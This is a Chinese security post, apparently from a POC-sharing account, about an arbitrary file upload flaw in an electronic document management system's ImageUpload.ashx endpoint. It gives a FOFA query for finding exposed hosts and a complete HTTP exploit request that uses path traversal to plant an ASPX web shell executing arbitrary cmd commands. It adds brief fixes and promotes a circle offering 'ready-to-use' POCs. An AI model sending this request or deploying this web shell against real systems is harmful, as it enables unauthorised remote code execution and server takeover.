#  电子资料管理系统 ImageUpload.ashx 任意文件上传漏洞   
Superhero  nday POC   2024-12-16 18:09  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkYN4sZibCVo6EFo0N9b7Kib4I4N6j6Y10tynLOdgov9ibUmaNwW5yeoCbQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkhic5lbbPcpxTLtLccZ04WhwDotW7g2b3zBgZeS5uvFH4dxf0tj0Rutw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCk524CiapZejYicic1Hf8LPt8qR893A3IP38J3NMmskDZjyqNkShewpibEfA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
内容仅用于学习交流自查使用，由于传播、利用本公众号所提供的  
POC  
信息及  
POC对应脚本  
而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号nday poc及作者不为此承担任何责任，一旦造成后果请自行承担！如文章有侵权烦请及时告知，我们会立即删除文章并致歉。谢谢！  
  
  
**00******  
  
**产品简介**  
  
  
电子资料管理系统  
（Electronic Document Management System，简称EDMS），是一个通过电子设备由人、计算机及其他外围设备等组成的能进行信息的收集、传递、存贮、加工、维护和使用的系统。系统提供集中化的文档存储和管理功能，帮助企业高效组织和管理电子资料。通过数字化索引和分类，员工可以快速查找和访问所需的文件，减少查找文档所需的时间。系统提供多层次的安全功能，如加密、基于角色的访问控制和审计日志，确保只有经过授权的用户才能访问和修改文档，减少数据泄露和不合规的风险。支持团队成员之间的协作，以及与外部利益相关者的共享功能。通过权限管理，安全地与客户或外部利益相关者共享文档。能够轻松管理文档的版本，确保用户安心。旧版本是文件的完整备份，在整个版本中保留统一的元数据。部分系统支持工作流程自动化功能，帮助企业简化操作流程，提高工作效率。  
**01******  
  
**漏洞概述**  
  
  
电子资料管理系统 /Menu/ImageManger/ImageUpload.ashx 接口存在文件上传漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。  
**02******  
  
**搜索引擎**  
  
  
FOFA:  
```
body="Menu/Login/ThirdLoginHandler.ashx"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwL6icuAfeiaoqbhvCsQAV6s9We9EX67TaleG9Y8a4oMuU6fz8T5othmjia25VkdYBv8KuR7dibsPgKYFA/640?wx_fmt=png&from=appmsg "")  
  
  
**03******  
  
**漏洞复现**  
```
POST /Menu/ImageManger/ImageUpload.ashx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryssh7UfnPpGU7BXfK
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip

------WebKitFormBoundaryssh7UfnPpGU7BXfK
Content-Disposition: form-data; name="isUpload"

印章图片
------WebKitFormBoundaryssh7UfnPpGU7BXfK
Content-Disposition: form-data; name="entid"

666
------WebKitFormBoundaryssh7UfnPpGU7BXfK
Content-Disposition: form-data; name="Type"

1
------WebKitFormBoundaryssh7UfnPpGU7BXfK
Content-Disposition: form-data; name="Filedata"; filename="../rce.aspx"
Content-Type: text/plain

<%@ Page Language="Jscript" validateRequest="false" %><%var c=new System.Diagnostics.ProcessStartInfo("cmd");var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments="/c " + Request.Item["cmd"];e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write(out.ReadToEnd() + EI.ReadToEnd());System.IO.File.Delete(Request.PhysicalPath);Response.End();%>
------WebKitFormBoundaryssh7UfnPpGU7BXfK--
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwL6icuAfeiaoqbhvCsQAV6s9Wqibv3s6rsAINPLibZrliclrhXXaamxGRBuc3yXejaB1OqeUCU5rtwuR1Q/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwL6icuAfeiaoqbhvCsQAV6s9WQDDNJ8ttdVLkxYrBb5qORWGaIjxnYE4WnvcaeABAXWqBzCkRwPcr4w/640?wx_fmt=png&from=appmsg "")  
  
  
**04**  
  
**检测工具**  
  
  
nuclei  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwL6icuAfeiaoqbhvCsQAV6s9WL8o9n7JF1v1Qv2eT0bLiaVf49hnKv4yREjNI1LuFb0LOajdEh5TWVsw/640?wx_fmt=png&from=appmsg "")  
  
afrog  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwL6icuAfeiaoqbhvCsQAV6s9WbMgicwZf78zFQicicsUgLsul9RgzAuQfIZvJC4exUKhFSiauLxQN5okm7A/640?wx_fmt=png&from=appmsg "")  
  
xray  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwL6icuAfeiaoqbhvCsQAV6s9WQicMR2rvr2dpWK3pU9SzvEx8mz5oP2d0Jfjd2ZRicRfC5aib65nhAfUzA/640?wx_fmt=png&from=appmsg "")  
  
  
**05******  
  
**修复建议**  
  
  
1、关闭互联网暴露面或接口设置访问权限  
  
2、  
打补丁或升级至安全版本   
  
**06******  
  
**内部圈子介绍**  
  
  
1、本圈子主要是分享网上公布的1day/nday POC详情及对应检测脚本，目前POC脚本均支持xray、afrog、nuclei等三款常用工具。  
  
2、三款工具都支持内置poc+自写poc目录一起扫描。  
  
3、保持每周更新10-15个poc。  
  
4、所发布的POC脚本均已测试完毕，直接拿来即用。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwI0X77l5WtnpfTexA6RwHXSbf1x3ZyT3bhcbWzRoFLyAgHkSMk9yGaZK5FDGcSCQp9ibPcicxHXIOcg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&retryload=2&tp=webp "")  
  
  
  
